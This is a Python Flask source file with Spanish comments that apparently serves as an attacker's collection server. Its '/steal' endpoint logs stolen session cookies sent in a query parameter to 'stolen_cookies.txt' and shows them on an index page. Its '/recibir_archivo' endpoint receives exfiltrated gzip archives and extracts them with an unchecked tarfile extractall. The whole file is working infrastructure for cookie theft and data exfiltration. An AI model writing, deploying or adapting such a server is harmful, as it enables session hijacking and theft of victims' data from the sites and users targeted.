from flask import Flask, request, render_template
import os
from datetime import datetime

app = Flask(__name__)

COOKIES_FILE = 'stolen_cookies.txt'

def guardar_cookie(cookie_data):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(COOKIES_FILE, 'a') as f:
        f.write(f"{cookie_data}|{timestamp}\n")

def cargar_cookies():
    if not os.path.exists(COOKIES_FILE):
        return []
    with open(COOKIES_FILE, 'r') as f:
        lines = f.readlines()
        cookies = []
        for line in lines:
            parts = line.strip().split('|')
            if len(parts) != 2:
                continue
            cookie, timestamp = parts
            cookies.append({'cookie': cookie, 'timestamp': timestamp})
        return cookies

@app.route('/')
def index():
    cookies = cargar_cookies()
    return render_template('index.html', cookies=cookies)

@app.route('/steal', methods=['GET'])
def steal():
    cookie = request.args.get('cookie')
    if cookie:
        guardar_cookie(cookie)
        return "Cookie received", 200
    return "No cookie provided", 400

import gzip
import tarfile
import os
from flask import request

@app.route('/recibir_archivo', methods=['POST'])
def recibir_archivo():
    gz_path = 'exfiltracion_recibida.gz'
    tar_path = 'exfiltracion_recibida.tar'
    extract_dir = 'data'

    # Guardar el archivo recibido
    with open(gz_path, 'wb') as f:
        f.write(request.get_data())

    print("Archivo exfiltrado recibido.")

    # Crear el directorio de extracción si no existe
    if not os.path.exists(extract_dir):
        os.makedirs(extract_dir)

    # Paso 1: Descomprimir el archivo .gz a .tar
    try:
        with gzip.open(gz_path, 'rb') as gz_file:
            with open(tar_path, 'wb') as tar_file:
                tar_file.write(gz_file.read())
        print("Archivo descomprimido de .gz a .tar")
    except Exception as e:
        print(f"Error al descomprimir el archivo .gz: {e}")
        return "error", 500

    # Paso 2: Extraer el archivo .tar
    try:
        with tarfile.open(tar_path, 'r') as tar:
            tar.extractall(path=extract_dir)
        print(f"Datos extraídos en el directorio '{extract_dir}'")
    except Exception as e:
        print(f"Error al extraer el archivo .tar: {e}")
        return "error", 500

    # Opcional: Eliminar los archivos temporales
    os.remove(gz_path)
    os.remove(tar_path)

    return "ok"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)
